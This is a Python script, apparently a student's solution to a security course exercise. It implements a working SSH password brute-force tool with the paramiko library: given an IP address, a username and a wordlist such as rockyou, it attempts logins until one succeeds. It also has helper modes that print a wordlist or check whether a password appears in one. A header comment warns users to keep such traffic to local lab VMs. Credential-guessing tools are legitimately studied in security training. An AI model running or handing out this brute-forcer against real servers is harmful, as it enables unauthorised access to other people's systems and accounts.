#!/usr/bin/env python3

# Script: Ops 401 Class 17 Ops Challenge Solution
# Author:Ethan Brock
# Date of latest revision: 09MAY2023
# Purpose: brute force attack
# Resources: Chatgpt 
  
  #REQUIREMENTS
#Add to your Python brute force tool the capability to:

#Authenticate to an SSH server by its IP address.
#Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

  #DEMO
# Add to your Python brute force tool the capability to:

# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# ----- Stay out of trouble! Restrict this kind of traffic to your local network VMs -----

# ----- TOOLS -----
#import sys, os

# SSH Library -> https://www.paramiko.org/
#import paramiko

# ----- VARIABLES -----
#host = input("Enter target host: ")
#username = input("Enter target username: ")
#filepath = input("Enter your wordlist filepath:\n")
#port = 22

#def connect_to_SSH():
  # setup the SSHClient
 # sshConnection = paramiko.SSHClient()
  # Auto-add host-key policy!
  #sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
  # WHILE ITERATING through password list
    # TRY connection EXCEPT: Failed to Authenticate and KeyboardInterrupt
  #try:
    # Create the SSH connection with info: host, port, username, and password. 
    #sshConnection.connect(host, port, username, "password")
    # print useful information if connected!

  #except paramiko.AuthenticationException:
    #print("Authentication Failed!\n")

  #except KeyboardInterrupt:
   # print("\n\n[*] User requested an interrupt.")
    #sys.exit() # this is Ctrl + C

  # If password was incorrect, move to next password. hint: .readline()
  #file = open("filepath", encoding="ISO-8859-1")
  #line = file.readline()
  #file.close()
  # Make sure to close your I/O resources, a.k.a file reader
  # Close the SSH connection as well according to Paramiko's docs
  #sshConnection.close()

#def iterator():
 # print("Iterate through rockyou passwords!")
  #return

#def checkPassword():
 # print("Check password ran")
  #return

#if __name__ == "__main__": # when my computer runs this file...do this stuff


 #   while True:
 #       mode = input("""
#Brue Force Wordlist Attack Tool Menu
#1 - Offensive, Dictionary Iterator
#2 - Defensive, Password Recognized
#3 - Exit
#    Please enter a number:
#""")
#        if (mode == "1"):
#            iterator()
#        elif (mode == "2"):
#            checkPassword()
#        elif (mode == '3'):
#            break
#        else:
#            print("Invalid selection...")

# START CODE

import time
import paramiko

def ssh_brute_force(ip_address, username, wordlist_path):
    with open(wordlist_path) as f:
        for password in f:
            password = password.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=username, password=password)
                print(f"Password found: {password}")
                ssh.close()
                return True
            except:
                print(f"Failed with password: {password}")
                ssh.close()
                continue
        print("Password not found in word list.")
        return False

print("Select a mode:")
print("1. Offensive; Dictionary Iterator")
print("2. Defensive; Password Recognized")
print("3. SSH brute force")

mode = int(input())

if mode == 1:
    filepath = input("Enter the file path for the word list: ")
    with open(filepath) as f:
        for word in f:
            word = word.strip()
            print(word)
            time.sleep(0.5)
elif mode == 2:
    password = input("Enter a password to search for: ")
    filepath = input("Enter the file path for the word list: ")
    with open(filepath) as f:
        if password in f.read():
            print("Password recognized!")
        else:
            print("Password not found in word list.")
elif mode == 3:
    ip_address = input("Enter the IP address of the SSH server: ")
    username = input("Enter the username for the SSH connection: ")
    wordlist_path = input("Enter the file path for the word list: ")
    ssh_brute_force(ip_address, username, wordlist_path)
else:
    print("Invalid mode selected.")

    #END CODE
